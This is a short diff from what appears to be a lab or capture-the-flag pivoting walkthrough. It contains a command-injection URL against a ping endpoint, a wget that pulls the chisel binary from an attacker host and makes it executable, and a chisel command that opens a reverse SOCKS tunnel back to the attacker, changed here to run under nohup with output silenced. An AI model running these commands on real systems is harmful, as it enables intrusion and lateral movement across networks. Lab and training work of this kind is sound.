@@ -163,7 +163,7 @@ curl "http://10.10.1.20:5000/ping?host=;chmod%20%2Bx%20/tmp/chisel"
 ssh root@10.10.1.20 "wget http://10.10.1.10:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
 
 # Run chisel client on pivot1 (reverse SOCKS proxy back to attacker)
-ssh root@10.10.1.20 "/tmp/chisel client 10.10.1.10:8888 R:1080:socks &"
+ssh root@10.10.1.20 "nohup /tmp/chisel client 10.10.1.10:8888 R:1080:socks > /dev/null 2>&1 &"
 ```
 
 Now proxychains works through the Chisel tunnel (same port 1080):
